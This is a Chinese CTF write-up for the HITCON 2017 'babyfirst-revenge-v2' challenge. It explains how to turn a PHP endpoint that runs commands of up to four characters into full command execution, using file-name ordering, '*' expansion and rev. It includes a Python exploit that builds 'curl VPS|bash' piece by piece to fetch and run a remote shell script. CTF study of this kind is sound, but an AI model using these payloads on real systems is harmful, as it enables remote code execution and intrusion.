# baby-first-revenge-v2
```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

在 babyfirst-revenge 的基础上加大了难度，字符被限制在了 4 个以内。

这样 `ls>>c` 就无法实现，`ls -t>g` 也就无法生成。

## 反转字符串
这里就有另一个思路，因为 ls 的按字典顺序排序，由于符号(`- >`)在字母之前，才导致需要 `>>` 附加到文件尾部才能生成正确的 `ls -t>g` 命令，那么我们尝试将分段的文件名 `ls -t >g` 逆向生成，使得字母在前面，比如`g> t- sl`，之后再利用 `rev` 命令反转过来，得到正确的 `ls -t>g` 命令。

又由于 t 在 s 的后面，直接这样生成会导致排序出错，实际生成这样的命令 `g> sl t-`，因此可以加入 `h` 参数，`h` 是用作格式化 `l` 参数之后的存储量大小，不带 `l` 参数则无意义，这里的作用就是使得 `ht-` 能在 `sl` 之前，顺利生成 `g> -th sl` 命令。

## * 的作用
`*` 相当于 `$(ls *)`，所以如果列出的第一个文件名为命令的话就会返回执行的结果，之后的作为参数传入。

我们先引入 `dir` 命令，该命令在大多数系统中都是 ls 的 alias。

因此，我们可以在当前目录下生成，`g>` `-th` `sl` `dir` 文件，通过 `*>g`（实际结果就是 `dir>g`），这里用 `dir` 而不是 `ls` 则是由于字典顺序的问题，这样 `dir` 在 `*` 命令执行后才是第一个被执行的命令，因此就能产生 `ls -ht > g` 的逆序文件

然后执行 `>rev` ，`*v` 会匹配到 `rev v`，执行后则得到正序的 `ls -ht>g`。

之后的步骤则跟 babyfirst-revenge 一样了。

exp(by Orange):

```Python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir',
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate `curl VPS|bash`
    # * 为隐去的 VPS ip 地址十进制的某位
    '>\;\\',
    '>sh\\',
    '>ba\\',
    '>\|\\',
    '>2\\',
    '>1*\\',
    '>8*\\',
    '>5*\\',
    '>7*\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',

    # got shell
    'sh x',
    'sh g',
]


r = requests.get('http://127.0.0.1:8009/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://127.0.0.1:8009/?cmd=' + quote(i))
    print(i)
    sleep(0.1)
```

## References
[HITCON 2017 babyfirst-revenge[-v2]浅析](https://xz.aliyun.com/t/1579)